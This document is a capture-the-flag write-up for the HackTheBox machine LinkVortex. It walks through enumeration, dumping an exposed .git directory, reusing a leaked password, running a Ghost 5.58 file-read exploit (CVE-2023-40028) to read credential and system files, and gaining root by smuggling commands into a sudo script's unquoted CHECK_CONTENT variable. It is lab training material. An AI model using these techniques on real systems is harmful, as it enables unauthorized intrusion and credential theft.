# LinkVortex - Easy

```sh
sudo vim /etc/hosts
# add linkvortex.htb

nmap -T4 -p- -A -Pn -v linkvortex.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
    * 80/tcp - http - Apache httpd

* ```nmap``` scan mentions there are some disallowed entries in the 'robots.txt' file

* the webpage on port 80 is for a tech company 'BitByBit Hardware'

* the blogs in the website are authored by 'admin'

* ```wappalyzer``` detects the webpage CMS as Ghost 5.58

* the website footer mentions a link for signing up - but this points to 'http://linkvortex.htb/#/portal/', which does not lead anywhere

* reviewing the /robots.txt entries, we get these pages:

    * /sitemap.xml - this leads to other sitemaps, but no other info is found
    * /ghost - this leads to a sign-in page at 'http://linkvortex.htb/ghost/#/signin'
    * /p - 404 not found
    * /email - 404 not found
    * /r - 404 not found

* in the sign in page, we have fields for email address & password - trying creds like 'admin@linkvortex.htb:admin' & 'admin@linkvortex.htb:password' does not work, but the error messages for this user (and non-existent users) confirm that this is a valid account

* the forgot password option in the sign in page does not work

* Googling for exploits associated with Ghost CMS 5.58 gives us a few exploits - [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) is a arbitrary file read exploit that seems applicable in this case, but it requires authentication

* web enumeration:

    ```sh
    gobuster dir -u http://linkvortex.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25
    # dir scan
    # this fails due to 301 redirects
    # 'Error: the server returns a status code that matches the provided options for non existing urls'

    ffuf -c -u 'http://linkvortex.htb' -H 'Host: FUZZ.linkvortex.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 230 -s
    # subdomain scan
    ```

* subdomain scan using ```ffuf``` gives us a subdomain 'dev.linkvortex.htb' - add this entry to ```/etc/hosts```

* checking the webpage for 'dev.linkvortex.htb' shows that it is under construction, and a new website will be launched soon

* we can check this webpage for any clues:

    ```sh
    gobuster dir -u http://dev.linkvortex.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md -t 25
    # this gives '.git' dir
    ```

* ```gobuster``` shows that the subdomain has a '.git' directory - we can download the '.git' directory to check for any secrets

* we can use [git-dumper](https://github.com/arthaud/git-dumper) for looking into this:

    ```sh
    git-dumper http://dev.linkvortex.htb/.git ~/linkvortex

    cd ~/linkvortex

    ls -la
    # check all the files

    cat Dockerfile.ghost
    # Dockerfile config

    grep -rnwiIe "PASSW\|PASSWORD\|PWD" . 2>/dev/null
    # search for password strings

    less ./ghost/core/test/regression/api/admin/authentication.test.js
    ```

* the ```Dockerfile.ghost``` file mentions the config file ```/var/lib/ghost/config.production.json```, and also refers scripts like ```/var/lib/ghost/wait-for-it.sh``` for the DB initialization

* searching for password strings in the repository gives us hits for a file ```./ghost/core/test/regression/api/admin/authentication.test.js``` - this includes a cleartext password 'OctopiFociPilfer45'

* we can try this password for the admin user that was found to be valid earlier - 'admin@linkvortex.htb' - in the login page on the main website at 'http://linkvortex.htb/ghost/#/signin' - and it works

* as we have authentication now, we can attempt the [exploit for CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028):

    ```sh
    chmod +x CVE-2023-40028
    # download the exploit and make it executable

    ./CVE-2023-40028 -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45' -h http://linkvortex.htb
    # this works
    # for this exploit, we have an interactive shell to read files

    /etc/passwd

    /etc/hosts

    /var/lib/ghost/config.production.json
    ```

    * using the exploit, we are able to read file content remotely - ```/etc/passwd``` content shows that we have a user 'node'

    * ```/etc/hosts``` shows the IP 172.20.0.2 is mapped to a seemingly random hostname - this could be the indicator of a Docker container

    * we can also check the config file found earlier from the Dockerfile - ```/var/lib/ghost/config.production.json```

    * the JSON config file gives us SMTP creds 'bob@linkvortex.htb:fibber-talented-worth'

* as we have creds for user 'bob', we can try using it to login via SSH:

    ```sh
    ssh bob@linkvortex.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    ```

* ```sudo -l``` shows that 'bob' can run this command as root - ```(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png```

* we can check the scripts:

    ```sh
    ls -la /opt

    ls -la /opt/ghost
    # not writable

    cat /opt/ghost/clean_symlink.sh
    ```

    ```sh
    #!/bin/bash

    QUAR_DIR="/var/quarantined"

    if [ -z $CHECK_CONTENT ];then
    CHECK_CONTENT=false
    fi

    LINK=$1

    if ! [[ "$LINK" =~ \.png$ ]]; then
    /usr/bin/echo "! First argument must be a png file !"
    exit 2
    fi

    if /usr/bin/sudo /usr/bin/test -L $LINK;then
    LINK_NAME=$(/usr/bin/basename $LINK)
    LINK_TARGET=$(/usr/bin/readlink $LINK)
    if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
        /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
        /usr/bin/unlink $LINK
    else
        /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
        /usr/bin/mv $LINK $QUAR_DIR/
        if $CHECK_CONTENT;then
        /usr/bin/echo "Content:"
        /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
        fi
    fi
    fi
    ```

    * the script sets a quarantined directory at ```/var/quarantined```
    
    * it also checks the environment var ```CHECK_CONTENT``` is not set (```-z``` option returns true if the string is null), and sets it to false

    * the first argument - the filename - is taken as input, and requires to end in '.png'

    * then, using ```sudo``` and ```test```, it checks if the file is a symlink - if it is not a symlink, the script does not do anything after that

    * if the PNG file is a symlink, the script fetches the filename using ```basename``` and the symlink target (where the symlink actually points) using ```readlink```

    * the script checks for mentions of ```etc``` and ```root``` in the symlink target path - if found, it deletes the symlink

    * if the symlink target path does not contain ```etc``` or ```root```, it moves the symlink to quarantine path; in the same block, if ```CHECK_CONTENT``` is set to true, then the symlink file contents are printed

* the major issue flagged in the script is the use of unquoted Bash variable - in the config line ```if $CHECK_CONTENT;then``` - it returns or evaluates the value of ```CHECK_CONTENT```

* this is such that if we use a command instead of a true/false value for this variable, the command would be evaluated - we can test this:

    ```sh
    ln -s /home/bob/user.txt test.png
    # create a symlink - so that the script gets executed till end

    # execute the script
    sudo CHECK_CONTENT='id' /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
    # this works, and the output of 'id' command is printed
    # which shows script is executed as 'root' user

    # create symlink again, as the previous one was moved
    ln -s /home/bob/user.txt test.png

    sudo CHECK_CONTENT='cat /root/root.txt' /usr/bin/bash /opt/ghost/clean_symlink.sh test.png
    # this prints the root flag
    ```
